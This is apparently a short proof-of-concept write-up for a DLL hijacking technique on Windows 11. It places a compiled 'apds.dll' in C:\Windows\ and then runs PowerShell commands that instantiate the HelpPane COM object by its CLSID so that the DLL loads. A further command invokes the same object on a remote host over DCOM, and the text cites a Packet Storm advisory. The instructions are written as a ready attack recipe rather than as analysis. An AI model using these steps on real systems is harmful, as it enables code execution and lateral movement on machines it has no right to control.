Description:

HelpPane object allows us to force Windows os to DLL hijacking 

Instructions:

1. Compile dll
2. Copy newly compiled dll "apds.dll" in the "C:\Windows\" directory 
3. Launch powershell and Execute the following command to test HelpPane object "[System.Activator]::CreateInstance([Type]::GetTypeFromCLSID('8CEC58AE-07A1-11D9-B15E-000D56BFE6EE'))"
4. Boom DLL Hijacked!
5. You can use this following command to Dcom Hijacking  [System.Activator]::CreateInstance([Type]::GetTypeFromCLSID('8CEC58AE-07A1-11D9-B15E-000D56BFE6EE'), x.x.x.x)

ref:
https://packetstormsecurity.com/files/175006/Microsoft-Windows-11-apds.dll-DLL-Hijacking.html
